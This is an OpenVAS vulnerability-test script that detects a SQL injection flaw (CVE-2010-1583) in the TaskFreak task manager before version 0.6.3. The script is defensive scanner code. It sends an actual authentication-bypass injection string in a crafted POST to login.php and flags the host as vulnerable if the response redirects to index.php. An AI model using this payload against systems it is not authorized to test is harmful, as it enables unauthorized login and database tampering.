##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_task_freak_sql_inj_vuln.nasl 8485 2018-01-22 07:57:57Z teissa $
#
# Task Freak 'loadByKey()' SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to view, add, modify or
  delete information in the back-end database.
  Impact Level: Application.";
tag_affected = "TaskFreak version prior to 0.6.3";

tag_insight = "The flaw exists due to the error in 'loadByKey()', which fails to sufficiently
  sanitize user-supplied data before using it in an SQL query.";
tag_solution = "Upgrade to the TaskFreak version 0.6.3
  http://www.taskfreak.com/download.php";
tag_summary = "This host is running Task Freak and is prone SQL Injection
  Vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902052");
  script_version("$Revision: 8485 $");
  script_tag(name:"last_modification", value:"$Date: 2018-01-22 08:57:57 +0100 (Mon, 22 Jan 2018) $");
  script_tag(name:"creation_date", value:"2010-05-25 13:56:16 +0200 (Tue, 25 May 2010)");
  script_cve_id("CVE-2010-1583");
  script_bugtraq_id(39793);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Task Freak 'loadByKey()' SQL Injection Vulnerability");
  script_xref(name : "URL" , value : "http://www.madirish.net/?article=456");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/58241");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/12452");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_task_freak_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("TaskFreak/installed");

  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

tfPort = get_http_port(default:80);

tfVer = get_kb_item("www/"+ tfPort + "/TaskFreak");
if(!tfVer){
  exit(0);
}

tfVer = eregmatch(pattern:"^(.+) under (/.*)$", string:tfVer);
if(tfVer[2] != NULL)
{
  ## Try an exploit
  filename = string(tfVer[2] + "/login.php");
  host = http_host_name( port:tfPort );
  authVariables ="username=+%221%27+or+1%3D%271%22++";

  ## Construct post request
  sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                   "Host: ", host, "\r\n",
                   "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                   "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                   "Accept-Language: en-us,en;q=0.5\r\n",
                   "Keep-Alive: 300\r\n",
                   "Connection: keep-alive\r\n",
                   "Referer: http://", host, filename, "\r\n",
                   "Content-Type: application/x-www-form-urlencoded\r\n",
                   "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                   authVariables);
  rcvRes = http_keepalive_send_recv(port:tfPort, data:sndReq);

  ## Check the Response
  if("Location: index.php?" >< rcvRes){
    security_message(tfPort);
  }
}
